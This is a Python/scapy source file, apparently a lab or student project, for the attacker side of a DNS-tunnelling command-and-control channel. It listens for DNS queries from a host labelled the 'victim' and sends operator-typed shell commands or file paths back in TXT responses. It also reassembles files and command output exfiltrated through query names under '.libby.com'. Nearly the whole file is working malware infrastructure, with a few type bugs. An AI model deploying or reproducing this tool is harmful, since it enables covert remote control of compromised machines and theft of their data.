from curses import OK
from scapy.all import DNS, DNSQR, DNSRR
from scapy.all import *
from scapy.layers.inet import UDP, IP
from scapy.all import *
import time

seqnum = 64
str_to_print = ""
file_buff = bytes(str_to_print)

def printFileHandler(pkt, input_seq,payload, flag):
    global seqnum, str_to_print, file_buff
    if seqnum == input_seq:
        if flag == 2:
            str_to_print += payload # why not = only ??
        else :
            file_buff += payload
        seqnum += 1
        if seqnum == 255:
            seqnum = 64
    sendDNSRes(pkt, "ok", str(flag))

    
def endFileHandler(pkt, input_seq, payload):
    global file_buff, seqnum
    if input_seq == seqnum:
        filename = input("enter file name: \n") # ??
        file_buff += payload
        seqnum = 64
        with open(filename, "wb") as file:
            file.write(file_buff)
        file_buff = bytes("")
    sendDNSRes(pkt, "ok", "3")


def endPrintHandler(pkt, input_seq,payload):
    global str_to_print , seqnum
    if seqnum == input_seq:
        str_to_print += payload
        seqnum = 64
        print(str_to_print)
        str_to_print = ""
    sendDNSRes(pkt, "ok", "4")
 

def HelloHandler(packet):
    flag_fileOrPrint = input("for file choose 1\nfor print choose 2\n")
    if flag_fileOrPrint == "1":
        res = input("enter file path.\n")
    if flag_fileOrPrint == "2":
        res = input("enter command\n")
    sendDNSRes(packet ,res, flag_fileOrPrint)
 
def sendDNSRes(packet, payload, flag):
    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src,
    )
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
    )
    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        rd=0,
        ancount=1,
        an=DNSRR(
            type='TXT',
            rdata=((flag + payload).encode()))
    )
    response_packet = ip / udp / dns
    time.sleep(0.5)
    send(response_packet)


def DNSHandler(pkt):
    global str_to_print, file_buff   
    victimseq = pkt[0]['IP'].ttl
    fileOrPrint = pkt[0]['DNS'].tc # 1 byte field, contain 0 or 1 (for file or print).
    
    #if it's a file do not decode.
    if fileOrPrint == 0:
        #split the domain from the rest of the payload
        payload = pkt[0]['DNS']['DNSQR'].qname.split(".libby.com".encode())[0]
        # because the data is encoded, deduct 48 for ascii representation
        handle_flag = str(payload[0]-48) 
    else:
        payload = pkt[0]['DNS']['DNSQR'].qname.decode().split(".libby.com")[0]
        handle_flag = payload[0]
    
    match handle_flag:
        case "1": # 1 - file.
            printFileHandler(pkt,victimseq, payload[1:],1)
        case "2":  # 2 - print.
            printFileHandler(pkt, victimseq, payload[1:],2)
        case "4":
            endPrintHandler(pkt, victimseq, payload[1:])
        case "3":
            endFileHandler(pkt, victimseq, payload[1:])
        case "8":
            HelloHandler(pkt)
 
            
def listenRes():
    while True:
        sniff(filter="udp and src host 10.0.2.4", prn=DNSHandler, timeout=5)
  
if __name__ == "__main__":
    listenRes()

